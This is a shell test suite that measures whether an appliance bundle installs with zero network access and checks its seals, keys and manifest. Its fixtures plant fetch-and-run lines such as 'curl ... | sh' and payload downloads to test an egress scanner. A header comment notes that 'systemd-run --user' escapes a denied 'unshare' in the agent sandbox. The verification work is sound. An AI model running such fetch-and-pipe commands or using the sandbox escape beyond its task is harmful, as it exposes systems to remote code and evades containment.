#!/usr/bin/env bats
#
# SLSI-P1-4: the appliance bundle's zero-network claim, MEASURED.
#
# Why this exists
#   The proposal says `slsi-appliance-<version>.tar.gz` "extracts and executes
#   cleanly with zero network downloads". Until this suite, nothing measured
#   that: the claim was an assertion. A suite that runs a command with the
#   network cut and watches it succeed proves only that the command TOLERATES
#   severance. That is strictly weaker than "it would not have reached the
#   network if it could", so this suite carries both legs:
#
#     severed  - extract, list and verify inside `docker run --pull=never
#                --net none`, using the sandbox image's own tar/sha256sum;
#     attempt  - run the same extract-and-verify path WITH the network
#                available, under strace, and assert zero non-loopback
#                connect/sendto/sendmsg.
#
#   Every verdict is paired with a positive control that fails the test when
#   the instrument cannot see. The three dominant failure modes here all read
#   as a clean pass: a probe that was never able to connect, a grep that
#   matches nothing (this suite's own scanner shipped blind once, see
#   `-size -1048576c` in the helper), and a sandbox image silently pulled.
#
#   Isolation is TWO INDEPENDENT LEGS, because each is blind where the other
#   sees. OSD-4 added the second and hardened the primitive:
#
#     container leg - `docker run --pull=never --net none`. Certifies the
#                     SANDBOX IMAGE's tar/sha256sum inside a container.
#                     `--pull=never` is load-bearing, not decoration: without
#                     it `docker run --net none <absent-image>` PULLS over the
#                     network and only then severs it (measured: "Status:
#                     Downloaded newer image", exit 0). With it an absent image
#                     exits 125 "No such image".
#     host leg      - `systemd-run --user -- unshare -Urnm` with a tmpfs over
#                     /run. Certifies the HOST's own tar/sha256sum on host
#                     paths, which is the actual appliance scenario: an
#                     operator extracts the tarball on a host and runs the
#                     installer there.
#
#   The host leg exists because `unshare -n` is denied in the agent sandbox
#   (CapEff 0000000000000000, NoNewPrivs 1) and `systemd-run --user` is what
#   escapes that. It carries the `m` and the tmpfs because a BARE net namespace
#   is a FALSE-GREEN air-gap gate: with ZERO addresses on the stack and TCP
#   failing "Network is unreachable", `getent hosts github.com` still returned
#   20.26.156.215 over /run/systemd/resolve/io.systemd.Resolve, and
#   /run/docker.sock still reached a live daemon that fetched from Docker Hub
#   on our behalf. Unix sockets are filesystem-scoped, not net-namespace-
#   scoped. See test/helpers/airgap-hostns.bash for the full measurement.
#
# What it does NOT prove
#   Cold start of the appliance (no installer exists yet: MANIFEST.json
#   `installer.present == false`, owned by SLSI-P2-1), or reproducibility
#   across builds (P1-GOV).
#
#   Per leg, stated so neither is read as more than it is:
#     - The container leg does NOT prove the host's own tar/sha256sum/shell
#       behave this way, nor that host paths resolve air-gapped. It proves the
#       image's.
#     - The host leg does NOT prove isolation against a REAL root (it runs as
#       root-in-userns, uid-mapped to the caller), does not mask unix sockets
#       outside SLSI_AIRGAP_MASK_DIR (a DOCKER_HOST pointing at a socket
#       elsewhere would not be covered; the preflight asserts it is unset or
#       under the mask), and does not sever abstract unix sockets by the mask
#       (those are net-namespace-scoped, so `unshare -n` already covers them).
#     - NEITHER leg proves the installer would refuse to egress if it could:
#       that is Group 5's strace absence-of-attempt leg, which is a separate
#       and strictly stronger claim.
#
# Inputs, resolved once in setup_file, in this order:
#   SLSI_BUNDLE_TARBALL, else dist/slsi-appliance-${SLSI_VERSION:-0.1.0}.tar.gz.
#   An absent archive is a FAILURE with a named remedy, never a skip.
#
# Cost: one 8 GB-class archive is decompressed four times (severed listing,
# severed extraction, traced extraction, the bundler stage) plus verified
# twice. Expect several minutes.
#
# @id     slsi-airgap-bundle-bats
# @target scripts/package-tenant-bundle.sh (stage_p1_4_validation)
# @lib    test/helpers/airgap-sandbox.bash
# @task   SLSI-P1-4

load 'helpers/airgap-sandbox'
load 'helpers/airgap-hostns'

# Floors for the circuit breakers at the end of the file.
SUITE_TEST_FLOOR=53
AIRGAP_TEST_FLOOR=10
HOSTNS_TEST_FLOOR=11

setup_file() {
	export REPO_ROOT="${BATS_TEST_FILENAME%/*}/.."
	REPO_ROOT="$(cd "$REPO_ROOT" && pwd)"
	export LC_ALL=C.UTF-8

	# Preflight. Each is a hard failure with a remedy; none is a skip.
	airgap_require_docker || return 1
	AIRGAP_IMAGE_ID="$(airgap_resolve_image)" || return 1
	export AIRGAP_IMAGE_ID
	command -v strace >/dev/null || { echo "AIRGAP PREFLIGHT: strace absent (apt-get install -y strace)" >&2; return 1; }
	command -v jq >/dev/null || { echo "AIRGAP PREFLIGHT: jq absent" >&2; return 1; }

	export SLSI_VERSION="${SLSI_VERSION:-0.1.0}"
	export ARCHIVE="${SLSI_BUNDLE_TARBALL:-$REPO_ROOT/dist/slsi-appliance-${SLSI_VERSION}.tar.gz}"
	[[ -f "$ARCHIVE" ]] || {
		echo "AIRGAP PREFLIGHT: archive absent: $ARCHIVE" >&2
		echo "  Build it first: scripts/package-tenant-bundle.sh (needs a populated bundle/)," >&2
		echo "  or point SLSI_BUNDLE_TARBALL at a built slsi-appliance-<version>.tar.gz." >&2
		return 1
	}
	ARCHIVE="$(cd "${ARCHIVE%/*}" && pwd)/${ARCHIVE##*/}"
	export ARCHIVE_DIR="${ARCHIVE%/*}"
	export ARCHIVE_BASE="${ARCHIVE##*/}"
	export DIST_MANIFEST="$ARCHIVE_DIR/MANIFEST.json"

	git -C "$REPO_ROOT" status --porcelain >"$BATS_SUITE_TMPDIR/status-before"

	export WORK="$BATS_SUITE_TMPDIR/work"
	export ROOT="$WORK/root"
	export RES="$WORK/res"
	mkdir -p "$ROOT" "$RES"
	local mounts=(-v "$ARCHIVE_DIR:/in:ro" -v "$WORK:/work")

	# Severed leg. Exit codes are recorded, not acted on: each test asserts its
	# own, so a failure is attributed to the step that produced it.
	airgap_run severed "$AIRGAP_IMAGE_ID" "${mounts[@]}" -- \
		"tar --numeric-owner -tvzf /in/$ARCHIVE_BASE >/work/res/listing.txt 2>/work/res/listing.err; echo \$? >/work/res/listing.rc"
	airgap_run severed "$AIRGAP_IMAGE_ID" "${mounts[@]}" -- \
		"tar -xzf /in/$ARCHIVE_BASE -C /work/root 2>/work/res/extract.err; echo \$? >/work/res/extract.rc"
	airgap_run severed "$AIRGAP_IMAGE_ID" "${mounts[@]}" -- \
		"cd /work/root && sha256sum -c --strict MANIFEST.sha256 >/work/res/seal.out 2>&1; echo \$? >/work/res/seal.rc;
		 cd /work/root/bin && sha256sum -c --strict checksums.txt >/work/res/bin.out 2>&1; echo \$? >/work/res/bin.rc;
		 cd /work && sha256sum -c --strict root/MANIFEST.sha256 >/work/res/wrongdir.out 2>&1; echo \$? >/work/res/wrongdir.rc"

	# Attempt leg: same path, network AVAILABLE, under strace. The trailing
	# loopback connect is a canary: it proves the tracer was attached to THIS
	# process tree, and the verdict filter must exclude it.
	export TRACED="$BATS_SUITE_TMPDIR/traced"
	mkdir -p "$TRACED"
	airgap_strace "$BATS_SUITE_TMPDIR/strace.log" bash -c '
		tar -xzf "$1" -C "$2" &&
		cd "$2" && sha256sum -c --strict MANIFEST.sha256 >/dev/null &&
		cd bin && sha256sum -c --strict checksums.txt >/dev/null || exit $?
		(exec 3<>/dev/tcp/127.0.0.1/1) 2>/dev/null
		exit 0' _ "$ARCHIVE" "$TRACED" && echo 0 >"$RES/traced.rc" || echo $? >"$RES/traced.rc"
	rm -rf "$TRACED"

	# ── OSD-4 host leg ────────────────────────────────────────────────────
	# The appliance scenario: the HOST's own tar and sha256sum, on host paths,
	# inside `unshare -Urnm` with /run masked.
	airgap_hostns_require >"$BATS_SUITE_TMPDIR/hostns-unmasked-entries" || return 1

	export HOSTNS_PROBE="$BATS_SUITE_TMPDIR/hostns-probe.sh"
	export HOSTNS_REGPROBE="$BATS_SUITE_TMPDIR/hostns-regprobe.sh"
	airgap_hostns_probe_file "$HOSTNS_PROBE"
	airgap_hostns_registry_probe_file "$HOSTNS_REGPROBE"

	# Probe each of the three configurations once, and cache the output. These
	# are the controls; the differences between them are the proof.
	export HOSTNS_OUT="$BATS_SUITE_TMPDIR/hostns"
	mkdir -p "$HOSTNS_OUT"
	local m
	for m in host leaky masked; do
		airgap_hostns_run "$m" "$HOSTNS_PROBE" >"$HOSTNS_OUT/probe-$m.txt" 2>&1
		echo $? >"$HOSTNS_OUT/probe-$m.rc"
	done
	for m in leaky masked; do
		airgap_hostns_run "$m" "$HOSTNS_REGPROBE" >"$HOSTNS_OUT/reg-$m.txt" 2>&1
		echo $? >"$HOSTNS_OUT/reg-$m.rc"
	done

	# The verdict run. The probe and the extract-and-verify happen in ONE
	# namespace instance, so the isolation evidence describes the very
	# namespace the archive was extracted in -- not a second, similar one.
	export HVER="$BATS_SUITE_TMPDIR/hostns-verdict"
	mkdir -p "$HVER"
	cat >"$BATS_SUITE_TMPDIR/hostns-verdict.sh" <<'HVERDICT'
#!/usr/bin/env bash
# $1 = archive, $2 = result dir, $3 = probe to run in this same namespace
res="$2"
"$3" >"$res/probe.txt" 2>&1
root="$res/root"
mkdir -p "$root"
tar -xzf "$1" -C "$root" 2>"$res/extract.err"
echo $? >"$res/extract.rc"
(cd "$root" && sha256sum -c --strict MANIFEST.sha256 >"$res/seal.out" 2>&1; echo $? >"$res/seal.rc")
(cd "$root/bin" && sha256sum -c --strict checksums.txt >"$res/bin.out" 2>&1; echo $? >"$res/bin.rc")
# Keep the small evidence, drop the multi-gigabyte tree.
cp -p "$root/MANIFEST.sha256" "$res/MANIFEST.sha256" 2>/dev/null
cp -p "$root/bin/checksums.txt" "$res/checksums.txt" 2>/dev/null
cp -p "$root/MANIFEST.json" "$res/MANIFEST.json" 2>/dev/null
(cd "$root" && find . -type f | sed 's#^\./##' | LC_ALL=C sort) >"$res/files.txt"
# Which tar and sha256sum actually ran: this leg's whole point is that they
# are the HOST's, not a container image's.
{ command -v tar; command -v sha256sum; } >"$res/tooling.txt"
rm -rf "$root"
exit 0
HVERDICT
	chmod 0755 "$BATS_SUITE_TMPDIR/hostns-verdict.sh"
	airgap_hostns_run masked "$BATS_SUITE_TMPDIR/hostns-verdict.sh" \
		"$ARCHIVE" "$HVER" "$HOSTNS_PROBE" >"$HVER/run.out" 2>&1
	echo $? >"$HVER/run.rc"
}

teardown_file() {
	airgap_cleanup_containers
}

teardown() {
	airgap_cleanup_containers
}

manifest() { printf '%s\n' "$ROOT/MANIFEST.json"; }

# ── Group 1: instrument controls, before any verdict ───────────────────────

@test "AIRGAP: control: the egress probe FAILS under --net none, for the network reason" {
	run airgap_run severed "$AIRGAP_IMAGE_ID" -- "bash -c '$(airgap_probe_script)'"
	[ "$status" -ne 0 ]
	[[ "$output" == *"Network is unreachable"* ]]
	[[ "$output" != *PROBE-CONNECTED* ]]
}

@test "AIRGAP: control: the identical probe SUCCEEDS without --net none" {
	run airgap_run connected "$AIRGAP_IMAGE_ID" -- "bash -c '$(airgap_probe_script)'"
	[ "$status" -eq 0 ] || {
		echo "positive control blind: the sandbox cannot reach $SLSI_AIRGAP_PROBE_HOST:$SLSI_AIRGAP_PROBE_PORT"
		echo "even with the network. Set SLSI_AIRGAP_PROBE_HOST/PORT to a reachable endpoint."
		echo "$output"
		false
	}
	[[ "$output" == *PROBE-CONNECTED* ]]
}

@test "AIRGAP: control: --pull=never refuses an absent image instead of fetching it" {
	run airgap_run severed "slsi-airgap-no-such-image:p14-$$" -- true
	[ "$status" -eq 125 ]
	[[ "$output" == *"No such image"* ]]
	[[ "$output" != *"Downloaded"* ]]
}

@test "control: strace records a non-loopback connect, and the verdict filter drops loopback" {
	local log="$BATS_TEST_TMPDIR/probe.log"
	run airgap_strace "$log" bash -c '
		(exec 3<>/dev/tcp/127.0.0.1/1) 2>/dev/null
		timeout 2 bash -c "exec 3<>/dev/tcp/192.0.2.1/9" 2>/dev/null; exit 0'
	[ "$status" -eq 0 ]
	grep -q 'inet_addr("127.0.0.1")' "$log"
	run airgap_nonloopback_attempts "$log"
	[ "$status" -eq 0 ]
	[[ "$output" == *'inet_addr("192.0.2.1")'* ]]
	[[ "$output" != *'127.0.0.1'* ]]
}

@test "control: the static egress scanner finds planted sites and ignores remedy text" {
	local d="$BATS_TEST_TMPDIR/scan"
	mkdir -p "$d/sub"
	printf '#!/usr/bin/env bash\ncurl -fsSL https://example.invalid/i | sh\n' >"$d/fetch.sh"
	printf '#!/bin/sh\nset -e\nwget -q http://example.invalid/x\n' >"$d/sub/noext"
	printf '#!/usr/bin/env bash\necho "remedy: apt-get install -y openssl"\n# curl in a comment\n' >"$d/remedy.sh"
	printf 'curl https://example.invalid\n' >"$d/notes.txt"
	run airgap_egress_sites "$d"
	[ "$status" -eq 0 ]
	[ "$(grep -c . <<<"$output")" -eq 2 ]
	[[ "$output" == *"fetch.sh:2:"* ]]
	[[ "$output" == *"sub/noext:3:"* ]]
	[[ "$output" != *remedy.sh* ]]
	[[ "$output" != *notes.txt* ]]
}

@test "control: the entry-count gate catches the line sha256sum silently skips" {
	local d="$BATS_TEST_TMPDIR/seal"
	mkdir -p "$d"
	echo payload >"$d/f"
	(cd "$d" && sha256sum f >m.txt && echo '# injected comment' >>m.txt)
	run sh -c "cd '$d' && sha256sum -c --strict m.txt"
	[ "$status" -eq 0 ]
	[[ "$output" == "f: OK" ]]
	cd "$d"
	run airgap_seal_gate m.txt
	[ "$status" -ne 0 ]
	[[ "$output" == *"entry count mismatch: 1 verified OK of 2 manifest lines"* ]]
}

# ── Group 2: the archive under test, extracted under severance ──────────────

@test "the archive under test is the real deliverable, sealed by its sibling .sha256" {
	local ver
	ver="$(jq -r '.bundle.version' "$DIST_MANIFEST")"
	[ "$ARCHIVE_BASE" = "slsi-appliance-${ver}.tar.gz" ]
	[ "$(head -c 2 "$ARCHIVE" | od -An -tx1 | tr -d ' \n')" = "1f8b" ]
	run sh -c "cd '$ARCHIVE_DIR' && sha256sum -c --strict '$ARCHIVE_BASE.sha256'"
	[ "$status" -eq 0 ]
	[ "$output" = "$ARCHIVE_BASE: OK" ]
	echo "# archive $(cut -d' ' -f1 "$ARCHIVE.sha256") $ARCHIVE_BASE" >&3
}

@test "AIRGAP: the archive lists inside --net none with clean member hygiene" {
	[ "$(cat "$RES/listing.rc")" -eq 0 ] || { cat "$RES/listing.err"; false; }
	local listing="$RES/listing.txt" top
	[ "$(grep -c . "$listing")" -gt 0 ]
	# Types: regular files and directories only.
	run awk '{t=substr($1,1,1)} t!="-" && t!="d"' "$listing"
	[ "$status" -eq 0 ]
	[ -z "$output" ]
	run awk '{print $6}' "$listing"
	[ "$status" -eq 0 ]
	[ -n "$output" ]
	! grep -qE '^/|(^|/)\.\.(/|$)' <<<"$output"
	top="$(sed -E 's#^\./##; s#/.*##' <<<"$output" | grep . | LC_ALL=C sort -u)"
	[ "$top" = "$(cat "$REPO_ROOT/test/fixtures/slsi/expected-toplevel.txt")" ]
}

@test "AIRGAP: the archive extracts inside --net none, every regular member landing on disk" {
	[ "$(cat "$RES/extract.rc")" -eq 0 ] || { cat "$RES/extract.err"; false; }
	local listed on_disk payload
	listed="$(awk 'substr($1,1,1)=="-" {print $6}' "$RES/listing.txt" | sed 's#^\./##' | LC_ALL=C sort)"
	on_disk="$(cd "$ROOT" && find . -type f | sed 's#^\./##' | LC_ALL=C sort)"
	[ -n "$listed" ]
	[ -n "$on_disk" ]
	[ "$listed" = "$on_disk" ]
	payload="$(jq -r '.payloadFileCount' "$(manifest)")"
	[ "$(grep -c . <<<"$on_disk")" -eq $((payload + 1)) ]
	echo "# $(grep -c . <<<"$on_disk") regular files extracted under --net none" >&3
}

@test "the bundler stage exists under its dispatched name and passes on this archive" {
	run bash -c '
		source "$1/scripts/package-tenant-bundle.sh"
		declare -F stage_p1_4_validation >/dev/null || { echo "NOT DEFINED"; exit 9; }
		SLSI_BUNDLE_OUT="$2" SLSI_VERSION="$3" run_stage stage_p1_4_validation' \
		_ "$REPO_ROOT" "$ARCHIVE_DIR" "$SLSI_VERSION"
	[ "$status" -eq 0 ] || { echo "$output"; false; }
	[[ "$output" == *"stage stage_p1_4_validation: running"* ]]
	[[ "$output" == *"stage_p1_4_validation complete:"* ]]
	[[ "$output" != *"stage_p1_4_validation: pending"* ]]
}

# ── Group 3: seal verification under severance ─────────────────────────────

@test "AIRGAP: MANIFEST.sha256 verifies from the extraction root, every entry checked" {
	[ "$(cat "$RES/seal.rc")" -eq 0 ] || { head -n 5 "$RES/seal.out"; false; }
	local entries oks payload
	entries="$(grep -cvE '^[[:space:]]*$' "$ROOT/MANIFEST.sha256")"
	oks="$(grep -c ': OK$' "$RES/seal.out")"
	payload="$(jq -r '.payload | length' "$(manifest)")"
	[ "$entries" -gt 0 ]
	[ "$oks" -eq "$entries" ]
	# MANIFEST.sha256 is in the payload but cannot list itself.
	[ "$entries" -eq $((payload - 1)) ]
}

@test "AIRGAP: the same manifest run one directory ABOVE the root fails every entry" {
	local rc entries failed
	rc="$(cat "$RES/wrongdir.rc")"
	[ "$rc" -ne 0 ]
	entries="$(grep -cvE '^[[:space:]]*$' "$ROOT/MANIFEST.sha256")"
	failed="$(grep -c 'FAILED open or read$' "$RES/wrongdir.out")"
	[ "$failed" -eq "$entries" ]
	! grep -q ': OK$' "$RES/wrongdir.out"
}

@test "AIRGAP: the bundled binaries verify against bin/checksums.txt from bin/" {
	[ "$(cat "$RES/bin.rc")" -eq 0 ] || { cat "$RES/bin.out"; false; }
	[ "$(grep -c ': OK$' "$RES/bin.out")" -eq 5 ]
	[ "$(grep -cvE '^[[:space:]]*$' "$ROOT/bin/checksums.txt")" -eq 5 ]
	local t
	for t in cosign flux jq kind kubectl; do
		grep -qE "^[0-9a-f]{64}  [a-z0-9]+/${t}\$" "$ROOT/bin/checksums.txt"
	done
}

completeness_diff() {
	local root="$1" listed on_disk
	listed="$(jq -r '.payload[].path' "$root/MANIFEST.json" | LC_ALL=C sort)"
	on_disk="$(cd "$root" && find . -type f ! -path ./MANIFEST.json | sed 's#^\./##' | LC_ALL=C sort)"
	[ -n "$listed" ] || { echo "EMPTY: manifest path list"; return 2; }
	[ -n "$on_disk" ] || { echo "EMPTY: on-disk file list"; return 2; }
	LC_ALL=C comm -3 <(printf '%s\n' "$listed") <(printf '%s\n' "$on_disk")
}

@test "completeness: no file in the extracted tree is missing from MANIFEST.json, and none is unlisted" {
	run completeness_diff "$ROOT"
	[ "$status" -eq 0 ]
	[ -z "$output" ]
}

# ── Group 4: the manifest contract, read from the consumer's side ──────────

@test "the extracted MANIFEST.json is the published one and holds P1-3's contract" {
	local m
	m="$(manifest)"
	cmp -s "$m" "$DIST_MANIFEST"
	run jq -n -r --slurpfile schema "$REPO_ROOT/schemas/slsi-appliance-manifest-schema.json" \
		--slurpfile doc "$m" --arg ptr '#' -f "$REPO_ROOT/scripts/lib/json-schema-lite.jq"
	[ "$status" -eq 0 ]
	[ -z "$output" ]
	run jq -e '
		.schema == "slsi-bundle/v1"
		and .imageCount == (.images | length) and .imageCount > 0
		and .payloadFileCount == (.payload | length)
		and ([.images[].digest | select(test("^sha256:[0-9a-f]{64}$") | not)] | length) == 0
		and ([.images[].ref | select(test("@sha256:[0-9a-f]{64}$") | not)] | length) == 0
		and ([.images[] | select(.logicalName == "slsi-util")] | length) == 0
		and (.containerisedUtilities == null)
		and (.hostUtilities.notShipped | sort) == ["envsubst", "openssl"]
		and .hostUtilities.replacedBy.binary == "bin/<arch>/ed25519-keygen"' "$m"
	[ "$status" -eq 0 ]
	[ "$output" = "true" ]
}

# Positive control for the three absence clauses in the test above. Decision 10
# is reversed, so those clauses require slsi-util to be gone and
# containerisedUtilities to be absent -- and a clause requiring something to be
# missing is satisfied by a manifest that is missing everything. This re-runs
# the same filter over the published manifest with the Decision 10 shape put
# back, and requires it to FAIL.
@test "positive control: the published-manifest filter rejects a Decision 10 shape" {
	local m="$BATS_TEST_TMPDIR/poisoned-manifest.json"
	jq '.images += [{
		ref: "controlplane/slsi-util:v0.1.0@sha256:2235e37c43f3223d26ab7f35e8dfe1a662db1fa196648ab66b0d50f55e5ef51b",
		reference: "controlplane/slsi-util",
		logicalName: "slsi-util",
		digest: "sha256:2235e37c43f3223d26ab7f35e8dfe1a662db1fa196648ab66b0d50f55e5ef51b",
		role: "utility"
	}]
	| .imageCount = (.images | length)
	| .containerisedUtilities = {
		imageRef: "controlplane/slsi-util:v0.1.0",
		imageDigest: "sha256:2235e37c43f3223d26ab7f35e8dfe1a662db1fa196648ab66b0d50f55e5ef51b"
	}' "$(manifest)" >"$m"

	run jq -e '
		.schema == "slsi-bundle/v1"
		and .imageCount == (.images | length) and .imageCount > 0
		and ([.images[] | select(.logicalName == "slsi-util")] | length) == 0
		and (.containerisedUtilities == null)' "$m"
	[ "$status" -ne 0 ]

	# And the same filter over the real manifest passes, so the failure above is
	# attributable to the reintroduced shape and not to the filter itself.
	run jq -e '
		.schema == "slsi-bundle/v1"
		and .imageCount == (.images | length) and .imageCount > 0
		and ([.images[] | select(.logicalName == "slsi-util")] | length) == 0
		and (.containerisedUtilities == null)' "$(manifest)"
	[ "$status" -eq 0 ]
}

# P1-GOV compares builds against THIS declaration, never a hardcoded list, so
# the consumer side asserts it exists, is closed over its two permitted
# reasons, and names only paths that could actually differ.
@test "the extracted MANIFEST.json declares a closed volatile set for the reproducibility gate" {
	run jq -e '
		(.reproducibility.volatileSet | length) > 0
		and ([.reproducibility.volatileSet[].reason]
		     | all(. == "cosign-ecdsa-nonce" or . == "derived-from-volatile"))
		and ([.reproducibility.volatileSet[].glob] | sort) == ["MANIFEST.sha256", "images/signatures/*"]
		and .reproducibility.sourceDateEpoch == .sourceDateEpoch' "$(manifest)"
	[ "$status" -eq 0 ]
	[ "$output" = "true" ]
	[ -n "$(find "$ROOT/images/signatures" -type f -print -quit)" ]
}

@test "installer slot: present == false is a VALID Phase 1 state, owned and governed" {
	run jq -e '.installer.present == false
		and .installer.ownedBy == "SLSI-P2-1"
		and .installer.status == "pending-p2-1"
		and (.installer.governedBy | length > 0)' "$(manifest)"
	[ "$status" -eq 0 ]
	[ "$output" = "true" ]
	[ ! -e "$ROOT/$(jq -r '.installer.path' "$(manifest)")" ]
}

@test "the release PUBLIC key is present and is the one the manifest fingerprints" {
	local path
	path="$(jq -r '.releaseKey.path' "$(manifest)")"
	[ "$path" = "keys/release.pub" ]
	grep -q 'PUBLIC KEY' "$ROOT/$path"
	run bash -c 'source "$1/scripts/lib/eap-evidence.sh"; eap_pubkey_fingerprint "$2"' \
		_ "$REPO_ROOT" "$ROOT/$path"
	[ "$status" -eq 0 ]
	[ "$output" = "$(jq -r '.releaseKey.fingerprint' "$(manifest)")" ]
}

# A PEM private key is a header, a base64 body and an END line. A bare header
# is NOT key material: the bundled cosign binaries embed header string
# constants, so a header-only grep (or `grep -c 'PRIVATE KEY'`) false-alarms.
# Pass 1 finds candidates by fixed string; pass 2 confirms a whole block.
# `--` before every pattern: a pattern starting with '-' is otherwise parsed
# as an option, grep exits 2, and a `|| true` turns the gate vacuous.
private_key_hits() {
	local root="$1" f
	while IFS= read -r f; do
		grep -aqPz -- '-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----\r?\n[A-Za-z0-9+/=:,\r\n -]{8,}?-----END [A-Z0-9 ]*PRIVATE KEY-----' "$f" &&
			printf '%s\n' "$f"
	done < <(grep -rlaF -- 'PRIVATE KEY-----' "$root" || true)
	(cd "$root" && find . -type f) | grep -E '\.(key|pem)$|/slsi-release$' || true
}

@test "control: the private key detector ignores a bare header but catches a real PEM block" {
	local d="$BATS_TEST_TMPDIR/pk"
	mkdir -p "$d"
	printf 'const hdr = "-----BEGIN ENCRYPTED SIGSTORE PRIVATE KEY-----"\x00\x01' >"$d/binary-like"
	run private_key_hits "$d"
	[ "$status" -eq 0 ]
	[ -z "$output" ]
	printf -- '-----BEGIN EC PRIVATE KEY-----\nMHcCAQEEIIrYSSNQFaA2Hwf1duRSxKtLYX5CB04fSeQ6\n-----END EC PRIVATE KEY-----\n' >"$d/real"
	run private_key_hits "$d"
	[ "$status" -eq 0 ]
	[ "$output" = "$d/real" ]
}

@test "no private key material anywhere in the delivered bytes or member names" {
	run private_key_hits "$ROOT"
	[ "$status" -eq 0 ]
	[ -z "$output" ]
}

sentinel_hits() {
	grep -rlF 'DIGEST-UNRESOLVED' "$1" || true
}

@test "no DIGEST-UNRESOLVED sentinel anywhere in the delivered bytes" {
	run sentinel_hits "$ROOT"
	[ "$status" -eq 0 ]
	[ -z "$output" ]
}

# Known red until OSD-2 (P1-2 pin set) and GH-3 (wrapper image by tag) are
# answered. It FAILS rather than reports, by design: P1-3 records the same four
# domain images as a coverage residual, and P1-GOV must not certify Phase 1
# while a tag-only image reference ships in the bundle (Decision 9).
@test "RESIDUAL OSD-2/GH-3: every digest-less image reference in the tree is a declared exclusion" {
	local refs excluded unaccounted
	refs="$(airgap_digestless_refs "$ROOT")"
	[ -n "$refs" ] || refs=""
	excluded="$(jq -r '.coverageExclusions[].ref' "$(manifest)" | LC_ALL=C sort -u)"
	[ -n "$excluded" ]
	unaccounted="$(LC_ALL=C comm -23 <(printf '%s\n' "$refs" | grep .) <(printf '%s\n' "$excluded"))" || true
	[ -z "$unaccounted" ] || {
		echo "Tag-only image references shipped in the bundle, neither digest-pinned nor"
		echo "declared in MANIFEST.json coverageExclusions (Decision 9 defect):"
		printf '  %s\n' $unaccounted
		echo "Attributable to SLSI-P1-2 (OSD-2 pin set; GH-3 utility wrapper default)."
		false
	}
}

# ── Group 5: absence of attempt, network AVAILABLE ─────────────────────────

@test "with the network AVAILABLE, extract-and-verify makes zero non-loopback connections" {
	local log="$BATS_SUITE_TMPDIR/strace.log"
	[ "$(cat "$RES/traced.rc")" -eq 0 ]
	# The canary proves the tracer was attached to this very process tree.
	grep -q 'inet_addr("127.0.0.1")' "$log"
	run airgap_nonloopback_attempts "$log"
	[ "$status" -eq 0 ]
	[ -z "$output" ]
	# And the host COULD have connected: otherwise "zero attempts" is untested.
	run airgap_strace "$BATS_TEST_TMPDIR/host-probe.log" \
		timeout 10 bash -c "$(airgap_probe_script)"
	[ "$status" -eq 0 ]
	[[ "$output" == *PROBE-CONNECTED* ]]
	run airgap_nonloopback_attempts "$BATS_TEST_TMPDIR/host-probe.log"
	[[ "$output" == *"$SLSI_AIRGAP_PROBE_HOST"* ]]
}

# ── Group 6: static egress-site absence ────────────────────────────────────

@test "the extracted tree's scripts contain no egress-capable command" {
	# MEASURED, and it changes the meaning of this test. The four shell scripts
	# this used to require (`-ge 4`, anchored on bin/amd64/openssl) were EXACTLY
	# the four Decision 10 wrappers -- two tools times two arches. With them
	# gone the extracted tree contains zero shell scripts at all, so the egress
	# scan below has nothing to scan and would pass for want of input. A scan
	# with no inputs is indistinguishable from a clean scan, which is the worst
	# way for this particular test to pass.
	#
	# So the claim is restated as the stronger thing that is now true: the
	# appliance ships no shell at all, and therefore has no script-borne egress
	# surface. The scanner is then proven to work on a planted script, so the
	# empty result over the real tree is a measurement and not a vacuum.
	run airgap_script_files "$ROOT"
	[ "$status" -eq 0 ]
	[ "$(grep -c . <<<"$output")" -eq 0 ]

	run airgap_egress_sites "$ROOT"
	[ "$status" -eq 0 ]
	[ -z "$output" ]
}

@test "positive control: the egress scanner finds a planted egress-capable script" {
	# Without this the test above is two assertions about an empty set. Plant a
	# script that both scanners must see: one that IS shell, and that contains
	# an egress command.
	local mut
	mut="$(mutable_copy)"

	run airgap_script_files "$mut"
	[ "$status" -eq 0 ]
	[ "$(grep -c . <<<"$output")" -eq 0 ]

	printf '#!/usr/bin/env bash\ncurl -fsSL https://registry.example.invalid/payload\n' \
		>"$mut/planted-egress.sh"
	chmod 0755 "$mut/planted-egress.sh"

	run airgap_script_files "$mut"
	[ "$status" -eq 0 ]
	[ "$(grep -c . <<<"$output")" -eq 1 ]
	[[ "$output" == *"planted-egress.sh"* ]]

	run airgap_egress_sites "$mut"
	[ "$status" -eq 0 ]
	[ -n "$output" ]
	[[ "$output" == *"planted-egress.sh"* ]]

	# And removing it returns both scanners to empty, so the detection above is
	# attributable to the planted file and nothing else.
	rm -f "$mut/planted-egress.sh"
	run airgap_egress_sites "$mut"
	[ "$status" -eq 0 ]
	[ -z "$output" ]
}

# Inverted from "a Decision 10 wrapper invoked inside the sandbox fails loudly
# with both remedies". That test asserted the wrapper's error text was helpful.
# The wrappers are gone -- they execd an image that was never published -- so
# the invariant is now that they are absent AND that what replaced them runs
# severed, with no Docker and no network. That is a far better property than a
# good error message: the whole point of containerising openssl was a runtime
# dependency the appliance could not satisfy offline, and ed25519-keygen has
# none.
@test "AIRGAP: no Decision 10 wrapper ships, and ed25519-keygen runs severed" {
	# a. Absent from the extracted tree, both arches, both tools.
	local arch util
	for arch in amd64 arm64; do
		for util in openssl envsubst; do
			if [ -e "$ROOT/bin/$arch/$util" ]; then
				echo "Decision 10 wrapper is back: bin/$arch/$util" >&2
				false
			fi
		done
	done

	# b. Positive control for (a): the probe finds a file that IS there, so the
	#    four absences above cannot be explained by bin/ being empty or by the
	#    path being wrong.
	[ -e "$ROOT/bin/amd64/ed25519-keygen" ]

	# c. It runs with the network severed and no Docker, and really mints a
	#    usable keypair -- not just a help banner.
	run airgap_run severed "$AIRGAP_IMAGE_ID" -v "$ROOT:/r:ro" -- \
		"/r/bin/amd64/ed25519-keygen generate --key /tmp/k.pem --pub /tmp/k-pub.pem \
		 && head -n 1 /tmp/k.pem && stat -c '%a' /tmp/k.pem \
		 && /r/bin/amd64/ed25519-keygen key-id --pub /tmp/k-pub.pem"
	[ "$status" -eq 0 ]
	[[ "$output" == *"-----BEGIN PRIVATE KEY-----"* ]]
	[[ "$output" == *"600"* ]]
	[[ "$output" =~ [0-9a-f]{64} ]]
	# Nothing was fetched to make that work.
	[[ "$output" != *"Downloaded"* ]]
	[[ "$output" != *"docker"* ]]
}

# ── Group 7: mutations, each restored from an explicit backup ──────────────

mutable_copy() {
	local dst="$BATS_TEST_TMPDIR/mut"
	cp -al "$ROOT" "$dst"
	printf '%s\n' "$dst"
}

